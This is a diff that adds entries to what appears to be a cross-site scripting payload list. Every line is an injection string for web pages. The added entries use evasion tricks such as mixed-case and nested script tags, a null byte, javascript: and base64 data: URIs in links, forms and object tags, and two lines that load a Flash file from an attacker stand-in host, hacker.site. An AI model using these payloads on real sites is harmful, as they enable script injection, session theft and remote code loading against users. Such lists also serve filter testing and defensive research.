@@ -11,3 +11,18 @@ alert(document[/coo/.source+/kie/.source])
 <svg/onload=alert(1)>
 <video src=x onerror=alert(1);>
 <audio src=x onerror=alert(1);>
+<ScRiPt>alert(1);</ScRiPt>
+<ScRiPt>alert(1);
+<script/random>alert(1);</script>
+<scr<script>ipt>alert(1)</scr<script>ipt>
+<scr<script>ipt>alert(1)</scr<script>ipt>
+<scr\x00ipt>alert(1)</scr\x00ipt>
+<a href="javascript:alert(1)">show</a>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">show</a>
+<form action="javascript:alert(1)"><button>send</button></form>
+<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
+<object data="javascript:alert(1)">
+<object data="data:text/html,<script>alert(1)</script>">
+<object data="data:text/html;base64, PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<object data="//hacker.site/xss.swf">
+<embed code="//hacker.site/xss.swf" allowscriptaccess=always>
